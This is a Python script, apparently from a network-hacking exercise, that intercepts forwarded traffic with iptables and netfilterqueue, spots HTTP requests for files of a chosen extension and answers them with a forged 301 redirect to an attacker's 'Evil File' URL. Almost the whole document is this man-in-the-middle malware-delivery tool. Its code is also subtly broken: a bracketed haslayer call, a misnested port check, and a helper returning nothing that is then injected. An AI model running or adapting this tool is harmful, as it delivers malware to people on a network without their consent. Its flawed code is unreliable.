#!/usr/bin/env python
# -*- coding: utf-8 -*-

import scapy.all as scapy
import netfilterqueue
from colorama import Fore
import sys, os
import optparse

iptables = os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-e", "--ext", dest="file_extension", help="Set File Extension to .exe, .pdf, .mp3, .mp4, .txt, .doc, .apk.")
    parser.add_option("-u", "--url", dest="file_url", help="Full URL of the Evil File\nEX. http://undertrick.com/test.exe.")
    (options, arguments) = parser.parse_args()
    if not options.file_extension:
        parser.error("[-] Please Specify the File Extension, use --help for more info.")
    elif not options.file_url:
        parser.error("[-] Please Specify the File URL, use --help for more info.")
    return options

ack_list =[]

def set_load(packet, load):
     packet[scapy.Raw].load = load
     del packet[scapy.IP].len
     del packet[scapy.IP].chksum
     del packet[scapy.TCP].chksum
     
def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer[scapy.Raw]:
          if scapy_packet[scapy.TCP].dport == 10000:
               if options.file_extension in scapy_packet[scapy.Raw].load and options.file_url not in scapy_packet[scapy.Raw].load:
                    print("[+] Detected the" +options.file_extension+ "File.")
                    ack_list.append(scapy_packet[scapy.TCP].ack)
               elif scapy_packet[scapy.TCP].sport == 10000:
                    if scapy_packet[scapy.TCP].seq in ack_list:
                         ack_list.remove(scapy_packet[scapy.TCP].seq)
                         print("[+] Replacing File...")
                         modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: "+options.file_url+"\n\n")
                         
                         packet.set_payload(str(modified_packet))
     packet.accept()
     
def nfqueue():
     try:
          queue = netfilterqueue.NetfilterQueue()
          iptables
          queue.bind(0, process_packet)
          print("[*] Running")
          return queue.run()
     except KeyboardInterrupt:
          print("[+] Resetting IPTables")
          os.system('iptables --flush')
          print("[*] Quit")
     
          
options = get_arguments()
nfqueue()
